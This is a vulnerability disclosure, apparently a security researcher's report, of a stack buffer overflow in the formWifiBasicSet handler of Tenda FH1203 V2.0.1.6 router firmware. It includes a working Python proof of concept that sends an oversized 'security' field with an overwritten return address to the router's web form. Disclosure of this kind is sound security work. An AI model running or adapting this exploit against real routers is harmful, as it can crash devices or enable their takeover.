## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

The Tenda FH1203 V2.0.1.6 firmware has a stack overflow vulnerability in the `formWifiBasicSet` function. The `v30` variable receives the `security` parameter from a POST request and is later assigned to the `v33` variable, which is fixed at 256 bytes. However, since the user can control the input of `security`, the statement `strcpy(v33, v30);` can cause a buffer overflow. The user-provided `security` can exceed the capacity of the `v33` array, triggering this security vulnerability.

![image-20240319221819491](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319221819491.png)

![image-20240319221952603](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319221952603.png)

![image-20240319222011509](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319222011509.png)

## PoC

```python
import requests
from pwn import *

url = 'http://192.168.84.101/goform/WifiBasicSet'
payload = b'a' * 500 + p32(0xdeadbeef)
data = {
    'security_5g':'1', 
    'hideSsid':'1', 
    'ssid':'1',
    'security':payload, 
    'wrlPwd':'1', 
    'hideSsid_5g':'1', 
    'ssid_5g':'1', 
    'wrlPwd_5g': '1'
}

requests.post(url, data=data)
```

![image-20240304213056127](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304213056127.png)